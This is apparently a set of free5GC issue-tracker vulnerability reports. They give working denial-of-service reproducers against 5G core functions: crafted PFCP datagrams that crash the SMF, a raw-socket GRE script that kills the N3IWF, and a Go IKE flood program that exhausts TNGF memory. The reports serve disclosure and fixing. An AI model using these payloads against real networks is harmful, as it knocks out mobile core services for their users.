items.title: [Bugs] SMF exits on single unauthenticated PFCP Session Establishment Requests due to uint16 IE length-wrap panics
items.body:
## Bug Decription

Two additional single UDP datagrams sent to the SMF's N4/PFCP port (8805/udp), with no authentication, terminate the SMF process in free5GC v4.2.3. Reproduced on the official v4.2.3 Docker deployment.

These are distinct from the previously reported 4-byte PFCP panic in #1158. They reach different IE decoders in `github.com/free5gc/pfcp@v1.1.2`, and both have length-consistent PFCP message headers, so they are not stopped by the outer `MessageLength == len(data)-4` check.

Both issues have the same root-cause pattern: a parser keeps `idx`, `length`, and an attacker-controlled field length as `uint16`, checks `length < idx + fieldLength`, and then slices with `data[idx : idx+fieldLength]`. A large field length such as `0xffff` makes the addition wrap, so the guard succeeds and the following slice has an upper bound smaller than the lower bound.

### R5-4-2 — SDF Filter flow-description length wrap

The datagram `21 32 00 1c 00 00 00 00 00 00 00 00 00 00 01 00 00 01 00 0c 00 02 00 08 00 17 00 04 31 30 ff ff` decodes as a PFCP Session Establishment Request containing a nested SDF Filter IE.

Observed panic:

```text
panic: runtime error: slice bounds out of range [4:3]
github.com/free5gc/pfcp/pfcpType.(*SDFFilter).UnmarshalBinary(...)
    /go/pkg/mod/github.com/free5gc/pfcp@v1.1.2/pfcpType/SDFFilter.go:124
```

Root cause: with `idx == 4` and `LengthOfFlowDescription == 0xffff`, `idx + s.LengthOfFlowDescription` wraps to `3`. The length guard therefore does not reject the input, and the next line slices `data[4:3]`.

Relevant code:

```go
s.LengthOfFlowDescription = binary.BigEndian.Uint16(data[idx:])
idx = idx + 2

if length < idx+s.LengthOfFlowDescription {
    return fmt.Errorf("inadequate TLV length: %d", length)
}
s.FlowDescription = data[idx : idx+s.LengthOfFlowDescription]
```

### R5-4-3 — Redirect Information address length wrap

The datagram `21 32 00 1b 00 00 00 00 00 00 00 00 00 00 01 00 00 03 00 0b 00 04 00 07 00 26 00 03 00 ff ff` decodes as a PFCP Session Establishment Request containing a nested Redirect Information IE.

Observed panic:

```text
panic: runtime error: slice bounds out of range [3:2]
github.com/free5gc/pfcp/pfcpType.(*RedirectInformation).UnmarshalBinary(...)
    /go/pkg/mod/github.com/free5gc/pfcp@v1.1.2/pfcpType/RedirectInformation.go:60
```

Root cause: with `idx == 3` and `RedirectServerAddressLength == 0xffff`, `idx + r.RedirectServerAddressLength` wraps to `2`. The length guard therefore does not reject the input, and the next line slices `data[3:2]`.

Relevant code:

```go
r.RedirectServerAddressLength = binary.BigEndian.Uint16(data[idx:])
idx = idx + 2

if length < idx+r.RedirectServerAddressLength {
    return fmt.Errorf("inadequate TLV length: %d", length)
}
r.RedirectServerAddress = data[idx : idx+r.RedirectServerAddressLength]
```

In both cases, the `recover()` path catches the panic but logs it as fatal and the SMF process exits, so a malformed network packet becomes a full SMF outage.

I re-verified these on 2026-09-14 against the local `free5gc-smf-1` container. The target recovered before each shot, and the current Docker-assigned SMF IP was used at send time.

| Input | Bytes | RestartCount | Result |
|---|---:|---:|---|
| C-03 positive control | 4 | 0 → 1 | CRASH |
| R5-4-2 | 32 | 2 → 3 | CRASH |
| R5-4-3 | 31 | 3 → 4 | CRASH |

## To Reproduce

1. Deploy free5GC v4.2.3 with the official Docker deployment. No source patch is needed. The SMF must be reachable on its N4/PFCP address, UDP/8805.
2. From any host/container that can route to the SMF's 8805/udp, send one of the datagrams below:

   ```bash
   # R5-4-2: SDF Filter length wrap, 32 bytes
   python3 -c "import socket;socket.socket(socket.AF_INET,socket.SOCK_DGRAM).sendto(bytes.fromhex('2132001c0000000000000000000001000001000c00020008001700043130ffff'),('<SMF_N4_IP>',8805))"

   # R5-4-3: Redirect Information length wrap, 31 bytes
   python3 -c "import socket;socket.socket(socket.AF_INET,socket.SOCK_DGRAM).sendto(bytes.fromhex('2132001b0000000000000000000001000003000b000400070026000300ffff'),('<SMF_N4_IP>',8805))"
   ```

3. Observe the panic in `docker logs <smf container>` and the SMF container restart.

## Expected Behavior

Malformed PFCP messages should be rejected with a parse error and dropped. A single malformed datagram must not terminate the SMF process.

The IE decoders should avoid overflow-prone bounds checks such as `length < idx + fieldLength`. A safer pattern is to convert to `int` and check the remaining buffer, for example `int(fieldLength) <= len(data)-int(idx)`, before slicing.

## Screenshots

Not applicable (headless containers).

## Environment

- free5GC Version: v4.2.3, official prebuilt Docker images
- Affected library: `github.com/free5gc/pfcp@v1.1.2`
- OS: Ubuntu 22.04.5 LTS host, Docker deployment
- Kernel version: 6.8.0-138-generic
- go version: runtime images ship no Go toolchain; the affected module is `github.com/free5gc/pfcp@v1.1.2`
- C compiler version (optional): n/a for this path

## Trace Files

### Configuration Files

Unmodified free5GC v4.2.3 Docker deployment. Relevant SMF PFCP/N4 listener configuration is the default `smfcfg.yaml` PFCP section for the container deployment.

### PCAP File

Not attached. The two trigger datagrams are shown in full above:

```text
R5-4-2: 2132001c0000000000000000000001000001000c00020008001700043130ffff
R5-4-3: 2132001b0000000000000000000001000003000b000400070026000300ffff
```

### Log File

Representative panic signatures:

```text
panic: runtime error: slice bounds out of range [4:3]
github.com/free5gc/pfcp/pfcpType.(*SDFFilter).UnmarshalBinary(...)
    /go/pkg/mod/github.com/free5gc/pfcp@v1.1.2/pfcpType/SDFFilter.go:124
```

```text
panic: runtime error: slice bounds out of range [3:2]
github.com/free5gc/pfcp/pfcpType.(*RedirectInformation).UnmarshalBinary(...)
    /go/pkg/mod/github.com/free5gc/pfcp@v1.1.2/pfcpType/RedirectInformation.go:60
```

## System Architecture (Optional)

Local container lab only. No traffic was sent to any system outside the lab. The demonstrated attacker model is any host that can route to the SMF's N4/PFCP port, UDP/8805.

## Walkthrough (Optional)

These inputs were found while fuzzing and replaying PFCP parser paths in `github.com/free5gc/pfcp@v1.1.2`, then verified with single live datagrams against the SMF. They are related to #1158 only in that they are in the same shared PFCP library and lead to the same process-level outcome. They do not use the same crash site:

- #1158: `pfcp@v1.1.2/decode.go:111`, derived PFCP header length exceeds the actual datagram length.
- R5-4-2: `pfcpType/SDFFilter.go:124`, `uint16` length addition wraps and slices `data[4:3]`.
- R5-4-3: `pfcpType/RedirectInformation.go:60`, `uint16` length addition wraps and slices `data[3:2]`.

Suggested fixes:

1. Replace `uint16` index arithmetic in IE decoders with non-wrapping `int` arithmetic and explicit remaining-buffer checks.
2. Rewrite checks as `needed <= remaining` before slicing, rather than checking `length < idx + needed` with overflow-prone arithmetic.
3. Ensure parser panics from malformed network input cannot terminate the NF process.

## Additional Context

I searched existing issues before filing. The closest prior report is #1158, but these inputs reach different parser code paths and should be fixed separately.

items.title: [Bugs] SMF process exits on a single 4-byte unauthenticated PFCP datagram (panic: slice bounds out of range [16:4] in github.com/free5gc/pfcp@v1.1.2)
items.body:
## Bug Decription

A single **4-byte** UDP datagram sent to the SMF's N4/PFCP port (8805/udp), with no
authentication, terminates the SMF process. Reproduced 3/3 on the official v4.2.3 Docker
deployment and again on a source build from tag v4.2.3.

The datagram `22 33 00 00` decodes as: PFCP version 1, S=1, message type 51
(Session Establishment Response), declared `MessageLength = 0`. The header consistency check
(`MessageLength == len(data)-4`) passes because `0 == 4-4`; the decoder then derives the header
length from the **message type** (16 bytes for session-related types ≥ 50) and slices
`data[16:4]`, which panics:

```
[FATA][SMF][PFCP] panic: runtime error: slice bounds out of range [16:4]
goroutine 8 [running]:
github.com/free5gc/pfcp.(*Message).Unmarshal(0x15fbe24720f0, {0x15fbe25f7000, 0x4, 0x800})
	/go/pkg/mod/github.com/free5gc/pfcp@v1.1.2/decode.go:111 +0x2394
github.com/free5gc/pfcp/pfcpUdp.(*PfcpServer).ReadFrom(0x...)
	/go/pkg/mod/github.com/free5gc/pfcp@v1.1.2/pfcpUdp/udp.go:86 +0xf6
github.com/free5gc/smf/internal/pfcp/udp.Run.func2(0x...)
	/go/src/free5gc/NFs/smf/internal/pfcp/udp/udp.go:51 +0x66
```

Note the panic argument `{ptr, 0x4, 0x800}`: the slice handed to `Unmarshal` has `len=4`
(the datagram) and `cap=2048` (the receive buffer). The `recover()` in
`NFs/smf/internal/pfcp/udp/udp.go:46` catches the panic but logs it as `FATA` and the process
exits, so a recoverable parse error becomes a full NF outage. `docker inspect` shows
`RestartCount` climbing (observed 0 → 38 during repeated testing of this and related inputs).

The crash is in the **shared library** `github.com/free5gc/pfcp@v1.1.2` (the latest tag of
`free5gc/pfcp`), not in SMF business code, so any NF that links it and exposes a PFCP endpoint is
affected. Comparing v1.1.2 with the current `master` of that repository shows `decode.go` and
`header.go` are functionally unchanged: `Header.UnmarshalBinary` logs short-read errors as
warnings and still returns `nil`, and the length guard compares against `len(data)-4` while
`Header.Len()` can be 16, so the bug appears to still be present on master.

Measured trigger surface (each row confirmed by process exit, not by log inspection alone):

| Dimension | Values tested | Result |
|---|---|---|
| Session-related message types | 50, 51, 52, 53, 54, 55, 56, 57 | 8/8 panic (`data[16:len]`) |
| PFCP version bits | 0, 1, 2, 7 (three of them invalid) | 4/4 panic (version not validated) |
| S (SEID) flag | 0 and 1 | both panic (header length comes from the message type, not from S) |
| Node-related message types (< 50), datagram length 4–7 | e.g. `22 01 00 00` | panic (`data[8:4]`) |

The datagram length and the declared length must be self-consistent, otherwise the upstream
check rejects it; that is what makes the 4-byte form the minimal trigger:

| Datagram length | Declared length | Upstream check | Result |
|---|---|---|---|
| 4 | 0 | `Expected 4, got 4` — passes | **panic `[16:4]`** |
| 4 | 1..13 | `Expected 5..17, got 4` — rejected | survives (WARN, dropped) |
| 14 | 10 | `Expected 14, got 14` — passes | **panic `[16:14]`** |

## To Reproduce

1. Deploy free5GC v4.2.3 with the official docker-compose (no config changes; default
   `smfcfg.yaml`, PFCP listening on the SMF's N4 address).
2. From any host/container that can route to the SMF's 8805/udp (in our lab: the
   `pentest-client` container on the compose network):

   ```bash
   printf '\x22\x33\x00\x00' | socat - UDP-DATAGRAM:<SMF_N4_IP>:8805
   # or:
   python3 -c "import socket;socket.socket(socket.AF_INET,socket.SOCK_DGRAM).sendto(bytes.fromhex('22330000'),('<SMF_N4_IP>',8805))"
   ```

3. Observe the panic above in `docker logs <smf container>` and the container restart.
4. No packet capture needed: the trigger is 4 bytes, given in full above.

## Expected Behavior

`Message.Unmarshal` should validate `len(data) >= headerLen` (8 or 16 depending on the message
type) before slicing and return an error otherwise; the PFCP server should log the malformed
datagram at WARN/ERROR and keep serving. A single malformed datagram must not terminate the NF.
The PFCP version bits should also be validated (values 0/2/7 are currently accepted).

## Screenshots

Not applicable (headless containers).

## Environment

- free5GC Version: v4.2.3 (official prebuilt images `free5gc/smf:v4.2.3`, and a source build from
  tag v4.2.3; both affected)
- OS: Ubuntu 22.04.5 LTS (host), Docker deployment
- Kernel version: 6.8.0-138-generic
- go version: 1.26.2 (official builder image `golang:1.26.2-trixie`; runtime images ship no toolchain)
- C compiler version (optional): n/a for this path

## Trace Files

### Configuration Files

Unmodified defaults; relevant excerpt of `config/smfcfg.yaml`:

```yaml
pfcp:
  nodeID: 127.0.0.1
  listenAddr: 127.0.0.1        # N4/PFCP listen address (container-internal in our lab)
  externalAddr: 127.0.0.1
```

### PCAP File

Not attached: the trigger is the 4-byte datagram `22 33 00 00` shown above in full.

### Log File

The panic trace in "Bug Decription" above, captured from `docker logs` of the SMF container
(2026-09-03 and re-confirmed 2026-09-05 in a local lab; `RestartCount` 0 → 38 on the prebuilt
deployment, 0 → 2 on the source build).

## System Architecture (Optional)

Local container lab only (three 5G cores side by side, 58 containers, 5 Docker networks, UERANSIM
UE/gNB). No traffic was sent to any system outside the lab. The N4 port is not published outside
the host; the demonstrated attacker model is "any host that can route to 8805/udp", which in a
typical deployment includes every NF on the core network and any compromised UPF.

## Walkthrough (Optional)

Found while cross-checking upstream PFCP defect reports against other implementations. The
root cause is that `pfcpUdp` truncates the datagram to `4 + declaredLength` before decoding, while
the decoder derives the header length from the message type; when the (self-consistent) datagram
is shorter than that header length the slice panics. Suggested fixes:

1. In `decode.go`, before slicing by message type: `if len(data) < hdrLen { return fmt.Errorf(...) }`
   with `hdrLen = 16` for session-related types and `8` otherwise.
2. In `pfcpUdp/udp.go`, validate that `4 + declaredLength` is at least the header length for the
   message type before handing the buffer to the decoder.
3. In `NFs/smf/internal/pfcp/udp/udp.go`, make the `recover()` log the error and continue serving
   instead of logging `FATA` and exiting.
4. Validate the PFCP version bits.

items.title: [Bugs] N3IWF CREATE_CHILD_SA handler panics on empty Proposals array without length check, causing DoS
items.body:
## Bug Decription

A remote, authenticated attacker can crash the `N3IWF` process by replying to a production `CREATE_CHILD_SA` request with a `SecurityAssociation` payload whose `Proposals` list is empty. `continueCreateChildSA()` accesses `temporaryIkeMsg.SecurityAssociation.Proposals[0].SPI` without verifying that the slice is non-empty, which causes an immediate panic in the live IKE handler path.

Crash site in `n3iwf/internal/ike/handler.go`:

```go
outboundSPI := binary.BigEndian.Uint32(
    temporaryIkeMsg.SecurityAssociation.Proposals[0].SPI)
```

The upstream IKE SA payload parser accepts empty proposal lists, and the handler checks `securityAssociation != nil` but does not check `len(Proposals) > 0`.

## To Reproduce

Steps to reproduce the behavior:

1. Prepare a live free5GC `v4.2.1` lab with `N3IWF`, `UPF`, `amf`, and `n3iwue`, and make sure the host has the `gtp5g` kernel module loaded.

items.title: [Bugs] N3IWF GRE Unmarshal performs zero bounds checking on input buffer, Fatalf kills entire process, causing DoS
items.body:
## Bug Decription

A remote, authenticated attacker can crash the `N3IWF` process by sending a short GRE packet with length smaller than 4 bytes through the live NWu user-plane IPsec tunnel. `GREPacket.Unmarshal()` performs no bounds checking before reading `b[0]`, `b[1]`, and `b[2:4]`. The panic is then caught by the `forwardUL()` recover block, which calls `nwuupLog.Fatalf(...)` and terminates the whole process with `os.Exit(1)`.

Crash site in `n3iwf/internal/gre/message.go`:

```go
func (p *GREPacket) Unmarshal(b []byte) error {
    p.flags = b[0]
    p.version = b[1]
    p.protocolType = binary.BigEndian.Uint16(b[2:4])
    if p.GetKeyFlag() {
        p.key = binary.BigEndian.Uint32(b[offset:offset+4])
    }
}
```

Fatal recovery in `n3iwf/internal/nwuup/server.go`:

```go
defer func() {
    if p := recover(); p != nil {
        nwuupLog.Fatalf("panic: %v\n%s", p, string(debug.Stack()))
    }
}()
```

## To Reproduce

Steps to reproduce the behavior:

1. Prepare a live free5GC `v4.2.1` lab with `N3IWF`, `UPF`, `amf`, `n3iwf`, and `n3iwue` containers, and make sure the host has the `gtp5g` kernel module loaded.
2. Run command `test_n3iwf_nwuup_short_gre_fatal_dos.sh`.
4. The script restarts `amf` and `n3iwf`, cleans prior `n3iwue` state, starts a real `n3iwue`, waits until the log shows `PduSession Created`, confirms that `ipsec-2` exists, and then sends a 2-byte GRE payload `0x20 0x00` to `10.0.0.1` through `ipsec-2`.
5. During live Docker validation on `2026-04-04 UTC`, the script observed `sent-short-gre`, and `n3iwf` changed from `status=running running=true restart=0 exit=0` to `status=exited running=false restart=0 exit=1` with `finished=2026-04-04T06:51:14.800282681Z`.

Validated live reproduction command:

```bash
test_n3iwf_nwuup_short_gre_fatal_dos.sh
```

PoC script used in live Docker validation:

```bash
#!/usr/bin/env bash
set -euo pipefail

REPO_ROOT="/home/ubuntu/free5gc_v421/free5gc"
N3UE_LOG="/tmp/n3iwue_nwuup_short_gre.log"

cleanup_n3ue() {
  docker exec n3iwue sh -lc 'for pid in $(pgrep -f "/n3iwue" 2>/dev/null || true); do if [ "$pid" != "$$" ]; then kill "$pid" 2>/dev/null || true; fi; done; sleep 1'
  docker exec n3iwue sh -lc "cd /n3iwue && ./clean.sh >/tmp/n3iwue_clean.log 2>&1 || true"
}

wait_for_user_plane() {
  local timeout_secs="$1"
  local deadline=$((SECONDS + timeout_secs))

  while (( SECONDS < deadline )); do
    if docker exec n3iwue sh -lc "test -f '$N3UE_LOG' && grep -q 'PduSession Created' '$N3UE_LOG'"; then
      return 0
    fi
    sleep 1
  done

  return 1
}

cd "$REPO_ROOT"
trap cleanup_n3ue EXIT

echo "[*] restarting amf and n3iwf"
docker restart amf >/dev/null
docker restart n3iwf >/dev/null
sleep 3

echo "[*] cleaning previous n3iwue state"
cleanup_n3ue
docker exec n3iwue sh -lc "rm -f '$N3UE_LOG'"

start_ts="$(date -u +%Y-%m-%dT%H:%M:%SZ)"
echo "[*] trigger timestamp: $start_ts"

echo "[*] starting real n3iwue inside container"
docker exec -d n3iwue sh -lc "cd /n3iwue && ./n3iwue >'$N3UE_LOG' 2>&1"
sleep 1

echo "[*] waiting for user-plane setup"
if ! wait_for_user_plane 60; then
  echo "[!] n3iwue did not reach 'PduSession Created' within 60 seconds"
  echo "[*] recent n3iwue log"
  docker exec n3iwue sh -lc "tail -n 120 '$N3UE_LOG' 2>/dev/null || true"
  exit 1
fi

echo "[*] confirmed user-plane setup"
docker exec n3iwue sh -lc "ip -4 addr; ip xfrm state; ip link show type xfrm; ip link show type gre" >/tmp/n3iwue_short_gre_state.out 2>&1 || true
cat /tmp/n3iwue_short_gre_state.out

echo "[*] n3iwf status before trigger"
docker inspect n3iwf --format 'status={{.State.Status}} running={{.State.Running}} restart={{.RestartCount}} exit={{.State.ExitCode}} started={{.State.StartedAt}} finished={{.State.FinishedAt}}'

echo "[*] sending 2-byte GRE payload through ipsec-2"
docker exec n3iwue perl -MSocket -e 'use constant SO_BINDTODEVICE => 25; socket(my $s, AF_INET, SOCK_RAW, 47) or die "socket: $!\n"; setsockopt($s, SOL_SOCKET, SO_BINDTODEVICE, "ipsec-2\0") or die "bindtodev: $!\n"; bind($s, sockaddr_in(0, inet_aton("10.0.0.2"))) or die "bind: $!\n"; my $dst = sockaddr_in(0, inet_aton("10.0.0.1")); send($s, "\x20\x00", 0, $dst) or die "send: $!\n"; print "sent-short-gre\n";'

sleep 1

echo "[*] n3iwf status after trigger"
docker inspect n3iwf --format 'status={{.State.Status}} running={{.State.Running}} restart={{.RestartCount}} exit={{.State.ExitCode}} started={{.State.StartedAt}} finished={{.State.FinishedAt}}'

echo "[*] recent n3iwf logs"
docker logs --since "$start_ts" --tail 160 n3iwf 2>&1
```

## Expected Behavior

`N3IWF` should validate that the GRE buffer length is at least 4 bytes before reading `b[0]`, `b[1]`, and `b[2:4]`, and at least 8 bytes before reading the key field when the GRE key flag is set. The `forwardUL()` recover path should log a non-fatal error instead of calling `Fatalf`.

## Environment

- free5GC Version: `v4.2.1`
- OS: `Ubuntu 24.04.2 LTS`
- Kernel version: `6.14.0-37-generic`
- go version: `go1.26.1 linux/amd64`
- runtime N3IWF build: `commit hash 8fc08a09`, `go1.25.5 linux/amd64`
- Requires: `gtp5g` kernel module

items.title: [Bugs] TNGF accumulates stale IKE Security Associations indefinitely due to missing INFORMATIONAL handler and absent SA cleanup, enabling pre-authentication remote DoS
items.body:
## Bug Description

The TNGF accumulates IKE Security Association state without bound because of three compounding implementation gaps:

1. **No INFORMATIONAL exchange handler** — The IKE dispatcher at `dispatcher.go:50-58` only handles `IKE_SA_INIT`, `IKE_AUTH`, and `CREATE_CHILD_SA`. The `INFORMATIONAL` exchange type (37) falls through to the `default` case and is silently dropped with a warning log. This means UE-initiated `DELETE` notifications (RFC 7296 Section 1.4) are never processed, so IKE SAs and Child SAs created for that UE are never removed.

2. **No SA timeout or cleanup** — There is no periodic garbage collection, idle timeout, or maximum age for IKE Security Associations. Once `NewIKESecurityAssociation()` stores an entry in `context.IKESA` (`sync.Map`), it remains referenced forever unless explicitly deleted via `DeleteIKESecurityAssociation()` — which is only reachable from `TNGFUe.Remove()`, which is only called from NGAP-side context release, never from the IKE side.

3. **No SA count limit** — The `sync.Map` storing IKE SAs has no capacity limit. `NewIKESecurityAssociation()` will generate and store new SPIs indefinitely.

A remote, unauthenticated attacker can exploit this by flooding `IKE_SA_INIT` requests. Each successful exchange allocates ~7.2 KiB of Go heap that is never reclaimed (the `sync.Map` reference prevents garbage collection). At a measured rate of 94 SA/s from a single attacker, a TNGF container with 256 MB memory limit reaches OOM in ~6 minutes. With 10 concurrent attackers, a 128 MB container is exhausted in ~19 seconds.

**No SIM card or authentication is required.** `IKE_SA_INIT` is the first message of the IKE protocol and is accepted from any source.

**Missing dispatcher case** — `NFs/tngf/pkg/ike/dispatcher.go` lines 50-58:
```go
switch ikeMessage.ExchangeType {
case ike_message.IKE_SA_INIT:
    handler.HandleIKESAINIT(udpConn, localAddr, remoteAddr, ikeMessage)
case ike_message.IKE_AUTH:
    handler.HandleIKEAUTH(udpConn, localAddr, remoteAddr, ikeMessage)
case ike_message.CREATE_CHILD_SA:
    handler.HandleCREATECHILDSA(udpConn, localAddr, remoteAddr, ikeMessage)
default:
    ikeLog.Warnf("Unimplemented IKE message type, exchange type: %d", ikeMessage.ExchangeType)
    // ❌ INFORMATIONAL (type 37) silently dropped here
    // ❌ DELETE notifications never processed
    // ❌ DPD probes never answered
}
```

**Unconditional SA allocation** — `NFs/tngf/pkg/context/context.go` lines 179-199:
```go
func (context *TNGFContext) NewIKESecurityAssociation() *IKESecurityAssociation {
    ikeSecurityAssociation := new(IKESecurityAssociation)
    // ... generate random SPI ...
    context.IKESA.LoadOrStore(localSPIuint64, ikeSecurityAssociation) // stored forever
    return ikeSecurityAssociation
}
```

**Only deletion path unreachable from IKE** — `NFs/tngf/pkg/context/context.go` line 202:
```go
func (context *TNGFContext) DeleteIKESecurityAssociation(spi uint64) {
    context.IKESA.Delete(spi) // only called from TNGFUe.Remove() → only via NGAP, never IKE
}
```

**Per-SA memory footprint** — `NFs/tngf/pkg/context/ue.go` lines 141-194, `IKESecurityAssociation` struct:
```
DiffieHellmanSharedKey []byte  // 256 bytes (DH-2048)
SK_d, SK_ai, SK_ar     []byte  // 60 bytes (SHA1-based)
SK_ei, SK_er           []byte  // 32 bytes (AES-128)
SK_pi, SK_pr           []byte  // 40 bytes
ConcatenatedNonce      []byte  // ~64 bytes
ResponderSignedOctets  []byte  // ~500 bytes
Transform pointers (5)         // ~200 bytes
sync.Map entry overhead        // ~100 bytes
──────────────────────────────
Total measured:                  ~7.2 KiB per SA
```

## To Reproduce

**Prerequisites**: free5GC v4.2.1 with TNGF deployed in Docker.

1. PoC source code — complete self-contained Go project:

`go.mod`:
```
module poc-sa-flood

go 1.25.5

require github.com/free5gc/ike v1.2.0
```

`main.go`:
```go
package main

import (
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"strings"
	"time"

	ike_message "github.com/free5gc/ike/message"
	ike_security "github.com/free5gc/ike/security"
	"github.com/free5gc/ike/security/dh"
)

func main() {
	target := "10.100.200.1:500"
	if len(os.Args) > 1 {
		target = os.Args[1]
	}
	count := 2000
	containerName := "tngf"

	fmt.Println("[*] PoC: TNGF IKE SA Stale Accumulation → OOM")
	fmt.Printf("[*] Target: %s\n", target)
	fmt.Printf("[*] Flood count: %d IKE_SA_INIT requests\n\n", count)

	memBefore := getContainerMem(containerName)
	fmt.Printf("[1] Baseline memory: %s\n\n", memBefore)
	fmt.Println("[2] Flooding IKE_SA_INIT...")

	dhType := dh.StrToType(dh.DH_2048_BIT_MODP)
	successCount := 0
	failCount := 0
	startTime := time.Now()

	for i := 0; i < count; i++ {
		secret, err := ike_security.GenerateRandomNumber()
		if err != nil {
			failCount++
			continue
		}
		pubVal := dhType.GetPublicValue(secret)

		spiBytes := make([]byte, 8)
		io.ReadFull(rand.Reader, spiBytes)
		initiatorSPI := binary.BigEndian.Uint64(spiBytes)

		nonce := make([]byte, 32)
		io.ReadFull(rand.Reader, nonce)

		msg := buildIKESAInit(initiatorSPI, pubVal, nonce)
		data, err := msg.Encode()
		if err != nil {
			failCount++
			continue
		}

		conn, err := net.DialTimeout("udp", target, 2*time.Second)
		if err != nil {
			failCount++
			continue
		}

		conn.SetWriteDeadline(time.Now().Add(2 * time.Second))
		conn.Write(data)

		buf := make([]byte, 4096)
		conn.SetReadDeadline(time.Now().Add(2 * time.Second))
		n, err := conn.Read(buf)
		conn.Close()

		if err == nil && n > 0 {
			successCount++
		} else {
			failCount++
		}

		if (i+1)%500 == 0 {
			mem := getContainerMem(containerName)
			elapsed := time.Since(startTime)
			rate := float64(i+1) / elapsed.Seconds()
			fmt.Printf("    [%d/%d] success=%d fail=%d mem=%s rate=%.0f SA/s\n",
				i+1, count, successCount, failCount, mem, rate)
		}
	}

	elapsed := time.Since(startTime)
	fmt.Printf("\n    Done: %d sent, %d success, %d fail in %.1fs (%.0f SA/s)\n",
		count, successCount, failCount, elapsed.Seconds(), float64(count)/elapsed.Seconds())

	time.Sleep(2 * time.Second)
	memAfter := getContainerMem(containerName)
	fmt.Printf("\n[3] Memory: %s → %s\n", memBefore, memAfter)
	fmt.Printf("    Created %d stale IKE SAs (never cleaned up)\n", successCount)

	alive := checkAlive(target)
	fmt.Printf("\n[4] TNGF still alive: %v\n", alive)
	if !alive {
		fmt.Println("[!] TNGF is dead — likely OOM killed")
		fmt.Println("    Verify: docker inspect tngf --format='{{.State.OOMKilled}}'")
	}
}

func buildIKESAInit(initiatorSPI uint64, keData []byte, nonceData []byte) *ike_message.IKEMessage {
	ikePayload := new(ike_message.IKEPayloadContainer)

	sa := ikePayload.BuildSecurityAssociation()
	proposal := sa.Proposals.BuildProposal(1, ike_message.TypeIKE, nil)

	proposal.EncryptionAlgorithm = append(proposal.EncryptionAlgorithm,
		&ike_message.Transform{
			TransformType:    ike_message.TypeEncryptionAlgorithm,
			TransformID:      ike_message.ENCR_AES_CBC,
			AttributePresent: true,
			AttributeFormat:  ike_message.AttributeFormatUseTV,
			AttributeType:    ike_message.AttributeTypeKeyLength,
			AttributeValue:   128,
		})

	proposal.IntegrityAlgorithm = append(proposal.IntegrityAlgorithm,
		&ike_message.Transform{
			TransformType: ike_message.TypeIntegrityAlgorithm,
			TransformID:   ike_message.AUTH_HMAC_SHA1_96,
		})
	proposal.PseudorandomFunction = append(proposal.PseudorandomFunction,
		&ike_message.Transform{
			TransformType: ike_message.TypePseudorandomFunction,
			TransformID:   ike_message.PRF_HMAC_SHA1,
		})

	proposal.DiffieHellmanGroup = append(proposal.DiffieHellmanGroup,
		&ike_message.Transform{
			TransformType: ike_message.TypeDiffieHellmanGroup,
			TransformID:   ike_message.DH_2048_BIT_MODP,
		})

	ikePayload.BuildKeyExchange(ike_message.DH_2048_BIT_MODP, keData)
	ikePayload.BuildNonce(nonceData)

	return ike_message.NewMessage(initiatorSPI, 0,
		ike_message.IKE_SA_INIT, false, false, 0, *ikePayload)
}

func checkAlive(target string) bool {
	conn, err := net.DialTimeout("udp", target, 2*time.Second)
	if err != nil {
		return false
	}
	defer conn.Close()

	dhType := dh.StrToType(dh.DH_2048_BIT_MODP)
	secret, _ := ike_security.GenerateRandomNumber()
	pubVal := dhType.GetPublicValue(secret)
	nonce := make([]byte, 32)
	rand.Read(nonce)

	probe := buildIKESAInit(0x4242424242424242, pubVal, nonce)
	data, _ := probe.Encode()

	conn.SetWriteDeadline(time.Now().Add(2 * time.Second))
	conn.Write(data)

	conn.SetReadDeadline(time.Now().Add(3 * time.Second))
	buf := make([]byte, 4096)
	n, readErr := conn.Read(buf)
	return readErr == nil && n > 0
}

func getContainerMem(name string) string {
	cmd := exec.Command("docker", "stats", name, "--no-stream", "--format", "{{.MemUsage}}")
	out, err := cmd.Output()
	if err != nil {
		return "0B / 0B"
	}
	return strings.TrimSpace(string(out))
}
```

2. Set a 64 MB memory limit on the TNGF container and restart:

```bash
docker restart tngf && sleep 10
docker update --memory=64m --memory-swap=64m tngf
go build -o poc-aes-padding .
```

3. Run the flood PoC repeatedly until OOM Kill:

```bash
./poc-aes-padding --flood 10.100.200.1:500   # repeat until container dies
```

4. Verify OOM Kill:

```bash
$ docker inspect tngf --format='Status={{.State.Status}} OOMKilled={{.State.OOMKilled}} ExitCode={{.State.ExitCode}}'
Status=exited OOMKilled=true ExitCode=137
```

`ExitCode=137` = 128 + SIGKILL(9), confirming the kernel OOM Killer terminated the TNGF process.

## Expected Behavior

TNGF should implement the following mitigations:

1. **Add INFORMATIONAL exchange handler** to the dispatcher, processing DELETE payloads and DPD probes:

```go
case ike_message.INFORMATIONAL:
    handler.HandleInformational(udpConn, localAddr, remoteAddr, ikeMessage)
```

2. **Add SA idle timeout** — IKE SAs that do not complete IKE_AUTH within a configurable timeout (e.g., 30 seconds) should be automatically deleted:

```go
func (context *TNGFContext) NewIKESecurityAssociation() *IKESecurityAssociation {
    sa := new(IKESecurityAssociation)
    // ...
    time.AfterFunc(30*time.Second, func() {
        if sa.State < StateAuthComplete {
            context.DeleteIKESecurityAssociation(sa.LocalSPI)
        }
    })
    return sa
}
```

3. **Add SA count limit** — Reject new IKE_SA_INIT when the number of active SAs exceeds a configurable maximum, responding with `TEMPORARY_FAILURE` notification.

4. **Implement IKE COOKIE** (RFC 7296 Section 2.6) — Under load, require the initiator to prove reachability via a stateless cookie before allocating SA state, preventing IP-spoofed flooding.

## Environment

- OS: `Ubuntu 24.04.2 LTS`

items.title: [Bugs] AUSF: nausf-auth POST /ue-authentications panics when UDM token acquisition fails (nil ProblemDetails)
items.body:
## Bug Description

`POST /nausf-auth/v1/ue-authentications` can panic when `GenerateAuthDataApi()` returns an error with a nil `ProblemDetails` pointer.

The vulnerable path is:

```go
result, pd, err := p.Consumer().GenerateAuthDataApi(udmUrl, supiOrSuci, authInfoReq)
if err != nil {
    logger.UeAuthLog.Infof("GenerateAuthDataApi error: %+v", err)
    c.Set(sbi.IN_PB_DETAILS_CTX_STR, pd.Cause)
    c.JSON(http.StatusInternalServerError, pd)
    return
}
```

There is no nil check before `pd.Cause`. In the current implementation, `GenerateAuthDataApi()` can propagate token-acquisition errors from `GetTokenCtx()` with `pd == nil`, which makes the dereference reachable from normal request handling.

